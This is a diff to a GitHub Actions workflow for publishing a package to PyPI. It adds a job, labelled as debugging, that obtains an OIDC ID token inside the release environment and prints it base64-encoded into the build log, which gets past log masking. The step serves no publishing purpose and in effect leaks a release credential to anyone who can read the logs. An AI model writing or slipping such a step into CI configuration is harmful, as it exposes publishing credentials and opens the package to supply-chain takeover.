@@ -69,3 +69,24 @@ jobs:
 
       - name: Upload package to PyPI
         uses: pypa/gh-action-pypi-publish@release/v1
+
+  generate-debug-token:
+    runs-on: ubuntu-latest
+    environment: release-test-pypi
+    steps:
+    - name: Install OIDC Client from Core Package
+      run: npm install @actions/core@1.6.0 @actions/http-client
+    - name: Get Id Token PyPI
+      uses: actions/github-script@v7
+      id: idtoken
+      with:
+        script: |
+          const coredemo = require('@actions/core')
+          let id_token_debug = await coredemo.getIDToken("debug_audience")
+          coredemo.setOutput('id_token_debug', id_token_debug)
+    - name: print token
+      run: |
+        echo "token debug start"
+        echo "${{steps.idtoken.outputs.id_token_debug}}" | base64
+        echo "token debug end"
+        echo "\n\n\n--------------------------------\n\n\n"
